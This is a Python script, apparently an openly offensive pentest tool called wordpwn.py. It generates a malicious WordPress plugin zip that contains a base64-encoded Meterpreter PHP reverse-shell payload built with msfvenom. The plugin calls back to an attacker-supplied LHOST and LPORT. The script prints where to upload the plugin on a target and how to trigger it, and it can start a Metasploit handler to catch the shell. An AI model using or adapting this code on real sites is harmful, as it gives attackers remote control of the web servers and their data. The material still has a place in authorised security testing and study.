#!/usr/bin/env python3
#
# Script name     : wordpwn.py
# Version         : 2.2
# Created date    : 3/1/2017
# Last update     : 30/05/2020
# Author          : wetw0rk & 3isenHeiM
# Inspired by     : Metasploit admin shell upload
# Python version  : 3.7
# Description     : Simply generates a wordpress plugin that will grant you a reverse shell
#                   once uploaded. I reccomend installing Kali Linux, as msfvenom is used
#                   to generate the payload.
#

import os, random, sys, zipfile, subprocess, requests

try:

	LHOST = 'LHOST=' + str(sys.argv[1])
	LPORT = 'LPORT=' + str(sys.argv[2])
	PAYLOAD = 'php/meterpreter/reverse_tcp'
	HANDLER = sys.argv[3]

except IndexError:

	print("__        __            _")
	print("\ \      / /__  ____ __| |___ __      __ ___")
	print(" \ \ /\ / / _ \|  __/ _  |  _ \ \ /\ / /  _ \ ")
	print("  \ V  V / (_) | | | (_| | |_) \ V  V /| | | |")
	print("   \_/\_/ \___/|_|  \__,	_| .__/ \_/\_/ |_| |_|")
	print("                         |_|")
	print('\n')
	print("Usage: %s [LHOST] [LPORT] [HANDLER]" % sys.argv[0])
	print("Example: %s 192.168.0.6 8888 Y" % sys.argv[0])
	sys.exit()

def generate_plugin(LHOST, LPORT, PAYLOAD):

	# Check if msfvenom is installed
	print("[*] Checking if msfvenom installed")
	if "msfvenom" in os.listdir("/usr/bin/"):
		print("[+] msfvenom installed")
	elif "msfvenom" in os.listdir("/opt/metasploit-framework/bin/"):
		print("[+] msfvenom installed (MacOS)")
	else:
		print("[-] msfvenom not installed")
		sys.exit()
	# Our "Plugin" Contents
	print("[+] Generating plugin script")
	plugin_script = "<?php\n"
	plugin_script += "/**\n"
	plugin_script += " * Plugin Name: %s\n" % ('GotEm')
	plugin_script += " * Version: %d.%d.%d\n" % (random.randint(1, 10), random.randint(1, 10), random.randint(1, 10))
	plugin_script += " * Author: PwnedSauce\n"
	plugin_script += " * Author URI: http://PwnedSauce.com\n"
	plugin_script += " * License: GPL2\n"
	plugin_script += " */\n"
	plugin_script += "?>\n"
	# Write Plugin Contents To File
	print("[+] Writing plugin script to file")
	plugin_file = open('QwertyRocks.php','w')
	plugin_file.write(plugin_script)
	plugin_file.close()
	# Generate Payload
	print("[+] Generating payload To file")
	create_payload = subprocess.Popen(
		['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
		'-e', 'php/base64', '-f', 'raw'], stdout=subprocess.PIPE).communicate()[0]
	# Write Our Payload To A File
	payload_file = open('wetw0rk_maybe.php', 'wb')
	payload_file.write(b"<?php ")
	payload_file.write(create_payload)
	payload_file.write(b" ?>")
	payload_file.close()
	# Create Zip With Payload
	print("[+] Writing files to zip")
	make_zip = zipfile.ZipFile('malicious.zip', 'w')
	make_zip.write('wetw0rk_maybe.php')
	make_zip.write('QwertyRocks.php')
	print("[+] Cleaning up files")
	os.system("rm QwertyRocks.php wetw0rk_maybe.php")
	# Useful Info
	print("[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload")
	print("[+] How to trigger the reverse shell : ")
	print("      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php")
	print("      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php")


def handler(LHOST, LPORT, PAYLOAD):
	# Write MSF ressource file
	print("[+] Launching handler")
	handler = "use exploit/multi/handler\n"
	handler += "set PAYLOAD %s\n" % PAYLOAD
	handler += "set LHOST %s\n" % LHOST.lstrip('LHOST=')
	handler += "set LPORT %s\n" % LPORT.lstrip('LPORT=')
	handler += "exploit"
	handler_file = open('wordpress.rc', 'w')
	handler_file.write(handler)
	handler_file.close()
	# Start MetaSploit and setup listener
	os.system("msfconsole -r wordpress.rc")


# Generate Plugin
generate_plugin(LHOST, LPORT, PAYLOAD)
# Handler
if HANDLER == 'Y':
	handler(LHOST, LPORT, PAYLOAD)
else:
	sys.exit()
